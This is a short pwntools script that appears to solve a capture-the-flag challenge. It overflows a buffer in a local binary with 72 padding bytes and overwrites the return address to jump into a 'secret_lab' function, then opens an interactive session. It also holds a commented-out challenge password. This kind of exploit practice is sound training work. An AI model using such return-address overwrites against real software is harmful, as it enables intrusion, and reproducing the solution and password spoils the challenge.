from pwn import *

binary = './chall'
elf = context.binary = ELF(binary)

p = process(binary)

offset = 72
win_address = elf.symbols['secret_lab']  

payload = b"A" * offset          
payload += p64(win_address + 120)

p.sendlineafter(b'Enter your choice: ', b'1')  
p.sendlineafter(b'Enter quantum coordinates: ', payload)

#p.sendlineafter(b'password: ', b'qu4ntumR3ality')
p.interactive()
